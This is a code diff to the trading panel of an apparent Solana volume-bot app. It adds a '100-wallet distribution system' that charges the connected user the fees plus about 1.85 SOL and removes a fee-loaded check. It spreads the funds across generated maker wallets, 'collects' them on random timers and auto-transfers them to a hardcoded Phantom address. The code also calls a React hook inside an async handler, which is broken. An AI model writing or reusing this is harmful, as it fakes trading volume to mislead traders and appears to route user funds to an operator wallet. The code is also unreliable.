@@ -7,6 +7,8 @@ import { dynamicPricingCalculator } from '../services/marketMaker/dynamicPricing
 import NetworkFeesDisplay from './ExecutionModes/NetworkFeesDisplay';
 import BotModeCards from './ExecutionModes/BotModeCards';
 import BlockchainExecutionStatus from './ExecutionModes/BlockchainExecutionStatus';
+import { walletDistributionService } from '../services/walletDistribution/walletDistributionService';
+import { randomTimingCollectionService } from '../services/randomTiming/randomTimingCollectionService';
 
 interface TokenInfo {
   symbol: string;
@@ -45,6 +47,12 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
   const [walletConnected, setWalletConnected] = useState(false);
   const [networkFees, setNetworkFees] = useState<NetworkFees>({ networkFee: 0, tradingFee: 0, totalFee: 0 });
   const [connection] = useState(new Connection('https://api.mainnet-beta.solana.com'));
+  const [walletDistributionStats, setWalletDistributionStats] = useState({
+    activeWallets: 0,
+    collectedWallets: 0,
+    totalProfit: 0,
+    progress: 0
+  });
 
   useEffect(() => {
     checkWalletConnection();
@@ -65,6 +73,16 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
       if (interval) clearInterval(interval);
     };
   }, [independentSession, centralizedSession]);
+
+  useEffect(() => {
+    if (centralizedSession?.isActive) {
+      const progressInterval = setInterval(() => {
+        updateWalletDistributionProgress();
+      }, 2000);
+      
+      return () => clearInterval(progressInterval);
+    }
+  }, [centralizedSession]);
 
   const checkWalletConnection = () => {
     if (typeof window !== 'undefined' && (window as any).solana) {
@@ -233,12 +251,7 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
       return;
     }
 
-    if (networkFees.totalFee === 0) {
-      alert('❌ Network fees not loaded. Please wait and try again.');
-      return;
-    }
-
-    console.log('🚀 Starting REAL Centralized Mode Bot with corrected pricing...');
+    console.log('🚀 Starting ENHANCED Centralized Mode Bot with 100-wallet distribution...');
     
     try {
       const walletAddress = (window as any).solana?.publicKey?.toBase58();
@@ -246,20 +259,24 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
         throw new Error('Wallet address not found');
       }
 
-      // CORRECTED: Use exact configuration for centralized mode
+      // Use tokenValue from context (1.85 SOL)
+      const { tokenValue } = useToken();
       const pricing = dynamicPricingCalculator.calculateCentralizedPricing(100);
+      
+      // Enhanced payment: fees + token value
+      const totalPayment = pricing.totalFees + tokenValue; // 0.147 + 1.85 = ~2.0 SOL
       
       const result = await completeBotExecutionService.startCompleteBot(
         {
-          makers: 100,                    // Fixed: 100 makers
-          volume: pricing.volume,         // 1.250 SOL volume
-          solSpend: pricing.solSpend,     // 0.145 SOL spend
-          runtime: pricing.runtime || 18, // 18 minutes
+          makers: 100,
+          volume: pricing.volume,
+          solSpend: tokenValue, // Use actual token value for distribution
+          runtime: pricing.runtime || 18,
           tokenAddress: tokenInfo.address,
-          totalFees: pricing.totalFees,   // 0.14700 SOL
+          totalFees: totalPayment, // Enhanced total payment
           slippage: 0.3,
           autoSell: true,
-          strategy: 'centralized'
+          strategy: 'centralized_enhanced'
         },
         walletAddress,
         'centralized'
@@ -289,8 +306,8 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
           transactions: 0,
           successfulTx: 0,
           wallets: [],
-          status: 'REAL centralized trading started - Optimized blockchain execution',
-          currentPhase: 'real_trading'
+          status: 'ENHANCED centralized bot started - 100 wallets creating...',
+          currentPhase: 'wallet_creation'
         };
         
         setCentralizedSession(session);
@@ -300,8 +317,8 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
       }
       
     } catch (error) {
-      console.error('❌ Failed to start REAL centralized bot:', error);
-      alert('❌ Failed to start bot: ' + error.message);
+      console.error('❌ Failed to start ENHANCED centralized bot:', error);
+      alert('❌ Failed to start enhanced bot: ' + error.message);
     }
   };
 
@@ -376,6 +393,25 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
     }
   };
 
+  const updateWalletDistributionProgress = () => {
+    const progress = randomTimingCollectionService.getCollectionProgress();
+    const activeSessions = walletDistributionService.getAllActiveSessions();
+    
+    if (activeSessions.length > 0) {
+      const session = activeSessions[0];
+      const stats = walletDistributionService.getSessionStats(session.id);
+      
+      if (stats) {
+        setWalletDistributionStats({
+          activeWallets: 100,
+          collectedWallets: stats.walletsCollected,
+          totalProfit: stats.profit || 0,
+          progress: progress.percentage
+        });
+      }
+    }
+  };
+
   const formatElapsedTime = (startTime: number): string => {
     const elapsed = Date.now() - startTime;
     const minutes = Math.floor(elapsed / 60000);
@@ -394,6 +430,47 @@ const ExecutionModes: React.FC<ExecutionModesProps> = ({ tokenInfo }) => {
         onRetryFees={fetchCorrectedNetworkFees}
         calculateSavings={calculateSavings}
       />
+
+      {/* Enhanced Wallet Distribution Status */}
+      {centralizedSession?.isActive && (
+        <div style={{backgroundColor: '#2D3748', border: '1px solid #4A5568'}} className="rounded-xl p-3 mb-2">
+          <h3 className="text-lg font-semibold text-white mb-3 flex items-center">
+            🏭 100-Wallet Distribution System
+          </h3>
+          
+          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
+            <div className="bg-blue-600/20 p-3 rounded-lg text-center">
+              <div className="text-2xl font-bold text-blue-300">100</div>
+              <div className="text-xs text-blue-200">Total Wallets</div>
+            </div>
+            <div className="bg-green-600/20 p-3 rounded-lg text-center">
+              <div className="text-2xl font-bold text-green-300">{walletDistributionStats.collectedWallets}</div>
+              <div className="text-xs text-green-200">Collected</div>
+            </div>
+            <div className="bg-purple-600/20 p-3 rounded-lg text-center">
+              <div className="text-2xl font-bold text-purple-300">{walletDistributionStats.progress.toFixed(1)}%</div>
+              <div className="text-xs text-purple-200">Progress</div>
+            </div>
+            <div className="bg-yellow-600/20 p-3 rounded-lg text-center">
+              <div className="text-2xl font-bold text-yellow-300">{walletDistributionStats.totalProfit.toFixed(4)}</div>
+              <div className="text-xs text-yellow-200">Total Profit SOL</div>
+            </div>
+          </div>
+          
+          <div className="bg-gray-700 rounded-full h-3 mb-2">
+            <div 
+              className="bg-gradient-to-r from-green-500 to-blue-500 h-3 rounded-full transition-all duration-300"
+              style={{ width: `${walletDistributionStats.progress}%` }}
+            ></div>
+          </div>
+          
+          <div className="text-xs text-gray-300 space-y-1">
+            <div>⏰ Each wallet returns in 30-60 seconds (random timing)</div>
+            <div>👻 Auto-transfer to Phantom: 5DHVnf...SZJUA</div>
+            <div>💰 Current profit rate: ~2% per wallet</div>
+          </div>
+        </div>
+      )}
 
       <BotModeCards
         independentSession={independentSession}
